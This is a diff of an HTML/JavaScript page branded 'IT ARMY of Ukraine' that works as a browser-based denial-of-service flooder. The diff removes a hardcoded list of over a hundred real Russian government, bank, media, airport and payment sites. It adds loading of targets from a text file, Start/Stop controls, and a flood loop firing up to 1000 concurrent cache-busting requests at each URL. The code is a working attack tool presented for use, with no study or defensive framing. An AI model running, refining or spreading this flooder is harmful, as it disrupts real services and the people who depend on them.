@@ -1,133 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta charset="utf-8" />
   <title>IT ARMY of Ukraine</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
 </head>
 <body>
-<h1 style="text-align: center;">IT ARMY of Ukraine in <a href="https://t.me/itarmyofuraine/4" target="_blank">telegram</a></h1>
+<h1 class="text-center">
+  IT ARMY of Ukraine in <a href="https://t.me/itarmyofuraine/4" target="_blank">telegram</a>
+</h1>
+
+<div class="info-block">
+  <ol>
+    <li><i>(Optional)</i> Choose a text file with a list of URLs (each should be on a new line) if you want to attack URLs other than those provided below</li>
+    <li>Click START</li>
+  </ol>
+</div>
+
+<div class="file-input-block text-center">
+  <input type="file" name="inputfile" id="js-inputfile" class="file-input">
+</div>
+
+<div class="buttons-block">
+  <button type="button" id="js-start" class="btn-main btn-start">Start</button>
+  <button type="button" id="js-stop" class="btn-main btn-stop hidden">Stop</button>
+</div>
+
 <div id="stats"></div>
 
 <script>
-var targets = {
-  'https://mail.rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://cloud.rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mvd.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://pwd.wto.economy.gov.ru/ ': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://stroi.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://proverki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gazprom.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://lukoil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.nornickel.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://nlmk.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ugmk.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://omk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://109.207.1.97/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://109.207.1.118/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://api.developer.sber.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://api.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://gazeta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://kp.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://riafan.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://pikabu.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://kommersant.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://yaplakal.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://bezformata.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mosmetro.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://www.metro.spb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://transport.mos.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://parking.mos.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.dme.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.svo.aero': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.bestchange.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.moex.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://fss.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.finambank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.finam.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mosfund.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.minfinchr.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://minfin.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://roskazna.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.vedomosti.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://vsesmi.online': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://russian.rt.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.rossiya-airlines.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://www.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://pulkovoairport.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.tutu.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://vvo.aero': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.vnukovo.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.vl.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://aer.aero': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://cleanbtc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://bonkypay.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://changer.club': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://superchange.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mine.exchange': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://platov.co': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ww-pay.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://delets.cash': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://betatransfer.org': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ramon.money': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://coinpaymaster.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://bitokk.biz': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.netex24.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://cashbank.pro': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://flashobmen.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ychanger.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://multichange.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://24paybank.ne': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://royal.cash': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://prostocash.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://baksman.org': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://kupibit.me': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://abcobmen.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-}
+var targets = {};
 
 var statsEl = document.getElementById('stats');
 function printStats() {
-  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  statsEl.innerHTML = '<table class="stats-table"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
 }
 setInterval(printStats, 1000);
 
-var CONCURRENCY_LIMIT = 1000
-var queue = []
+var CONCURRENCY_LIMIT = 1000;
+var queue = [];
+var isRunning = false;
+var fileInput = document.getElementById('js-inputfile');
+var startBtn = document.getElementById('js-start');
+var stopBtn = document.getElementById('js-stop');
+
+fetch('urls_ru.txt')
+  .then(response => response.text())
+  .then(urls => composeTargets(urls));
+
+fileInput.addEventListener('change', function() {
+  var file = new FileReader();
+
+  file.onload = function() {
+    composeTargets(file.result)
+  }
+
+  file.readAsText(this.files[0]);
+});
+
+startBtn.addEventListener('click', function (event) {
+  event.preventDefault();
+  start();
+});
+
+stopBtn.addEventListener('click', function (event) {
+  event.preventDefault();
+  stop();
+});
 
 async function fetchWithTimeout(resource, options) {
   const controller = new AbortController();
@@ -151,6 +92,9 @@ async function flood(target) {
       await queue.shift()
     }
     rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    if (!isRunning) {
+      return;
+    }
     queue.push(
       fetchWithTimeout(target+rand, { timeout: 1000 })
         .catch((error) => {
@@ -170,8 +114,32 @@ async function flood(target) {
   }
 }
 
-// Start
-Object.keys(targets).map(flood);
+function start() {
+  isRunning = true;
+  Object.keys(targets).map(flood);
+  startBtn.classList.add('hidden');
+  stopBtn.classList.remove('hidden');
+  console.log('Started');
+}
+
+function stop() {
+  isRunning = false;
+  stopBtn.classList.add('hidden');
+  startBtn.classList.remove('hidden');
+  console.log('Stopped');
+}
+
+function composeTargets(urls) {
+  targets = {};
+
+  urls = urls.split('\n').filter(function (url) {
+    return url.length;
+  });
+
+  urls.forEach(function (url) {
+    targets[url] = {number_of_requests: 0, number_of_errored_responses: 0};
+  });
+}
 </script>
 </body>
 </html>
